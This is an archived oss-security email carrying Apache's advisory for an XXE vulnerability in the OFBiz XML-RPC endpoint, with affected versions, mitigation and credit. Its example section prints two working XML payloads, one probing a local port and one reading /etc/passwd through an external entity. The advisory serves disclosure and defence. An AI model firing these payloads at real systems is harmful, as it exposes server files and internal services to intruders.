X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1242" "Friday" "5" "October" "2018" "15:52:23" "+0300" "Taher Alkhateeb" "slidingfilaments@gmail.com" "<fad45546-af86-0293-9ea7-014553474b30@apache.org>" "52" "[oss-security] [SECURITY] CVE-2011-3600 Apache OFBiz XML-RPC XXE Vulnerability" "^Date:" nil nil "10" "2018100512:52:23" "[oss-security] [SECURITY] CVE-2011-3600 Apache OFBiz XML-RPC XXE Vulnerability" (number mark "U       slidingfilam Oct  5   52/1242  " thread-indent "\"[oss-security] [SECURITY] CVE-2011-3600 Apache OFBiz XML-RPC XXE Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20413 invoked by uid 550); 5 Oct 2018 13:13:50 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 7806 invoked from network); 5 Oct 2018 12:52:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=from:to:subject:message-id:date:user-agent:mime-version
         :content-transfer-encoding:content-language;
        bh=tvQgUBJKPwIF+E/lYkbgo0wguYLP14xtwBgl5hr4hn4=;
        b=vcZZzE7yrcVvo6hRiVVZg7ZhifP3s8bpmCDn20EPwMemPnk7MN5SXDxSxjI3brgFOl
         Mug7McyMS7cEuIXMEbzdA0GMAfz1jTMkEYp2/1T3qqlUTjWb048iyl+X2w0+agzCDQgu
         blIQIFNNUToJWqY25PI0kspLGK+PaEe4HOx7kNSoDuLly2/M7tUN5myQkUNZqGAwNN7t
         7mRKubHIABA/O19ZE42YTHL1ck/U+fo9SaVktOzBHzgWZ+w1WYcDXsMTiWlUdxRsoeb6
         wqFdqUu2yPjPhIrI+W/wOmtktXxNRIDMp7zrkJ9sdKLxvmx2gahKcfDc3O1hBrkHDq6c
         RfaQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:to:subject:message-id:date:user-agent
         :mime-version:content-transfer-encoding:content-language;
        bh=tvQgUBJKPwIF+E/lYkbgo0wguYLP14xtwBgl5hr4hn4=;
        b=OsnhG3C7kCZJTsqCtAVKB9DteTFUNK4pBTKMnXtH5jJLF09ir/+MVKajYztUg+++0k
         Qr50zwV03p3hq1GWuZ+9gxs2lprnEcKAxDVwHQDVFmKgpDAm6vCQq+/Wut2avfnH6w1Q
         ABS/AUVtE949+XywjSCYPRzF+GtssV27AMkZm1EiarxrjuZ/V5JU3NQWegMiA/fCBGX2
         ELryvuB68fU9YZioQo8VXtgBGg3R10UaTDrvKG6I8gBInwrrK4PLdRfp3gQ+CvVrN0QT
         aCoZqNWzFF5IKwQrNMprEhrF0gXj+kpBk0YEAMY9y32W/yEjW5SfbaOoYBqat/PVgMs0
         VAcA==
X-Gm-Message-State: ABuFfojhl8R8A3Cw8MS12ugkXmXn0d/3t2wVUduV3gov804XPwaR7+CF
	ugq0rtBKxQjA8/kjADNEoF4qyqw986z8Ng==
X-Google-Smtp-Source: ACcGV60QMglSo2rfzVxjnghXQAQQoplw/TZc9f9Gy/gHOQDMSUofTcmylyHP17X/YEpiuJHUAQ+mQA==
X-Received: by 2002:a1c:91cd:: with SMTP id t196-v6mr7354745wmd.63.1538743947146;
        Fri, 05 Oct 2018 05:52:27 -0700 (PDT)
X-Google-Original-From: Taher Alkhateeb <taher@apache.org>
Message-ID: <fad45546-af86-0293-9ea7-014553474b30@apache.org>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.9.1
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US
Date: Fri, 5 Oct 2018 15:52:23 +0300
From: Taher Alkhateeb <slidingfilaments@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] [SECURITY] CVE-2011-3600 Apache OFBiz XML-RPC XXE Vulnerability
To: user@ofbiz.apache.org, dev@ofbiz.apache.org, security@ofbiz.apache.org,
 security@apache.org, announce@apache.org, oss-security@lists.openwall.com,
 jamesp@mindpointgroup.com

Severity:
Important

Vendor:
The Apache Software Foundation

Versions Affected:
OFBiz 16.11.01 to 16.11.04

Description:
The OFBiz XML-RPC event handler 
(org.apache.ofbiz.webapp.event.XmlRpcEventHandler.java)
acts as a wrapper for any OFBiz service that provides XML-RPC web 
services via
the /webtools/control/xmlrpc endpoint. This endpoint is exposed to External
Entity Injection by passing DOCTYPE declarations with executable 
payloads that
discloses the contents of files in the filesystem. In addition, it can 
also be
used to probe for open network ports, and figure out from returned error
messages whether a file exists or not.

Mitigation:
Upgrade to 16.11.05
or manually apply the following commits on branch 16
r1833724
r1833708
r1836141

Example:
# Payload to find an exposed port
<?xml version="1.0"?>
<!DOCTYPE x SYSTEM "http://localhost:8080">
<methodCall>
     <methodName>ping</methodName>
</methodCall>

# Payload to display file contents
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY disclose SYSTEM "file:///etc/passwd">
]>
<methodCall>
     <methodName>&disclose;</methodName>
</methodCall>

Credit:
James Parfet <jamesp at mindpointgroup.com>

References:
http://ofbiz.apache.org/download.html#vulnerabilities

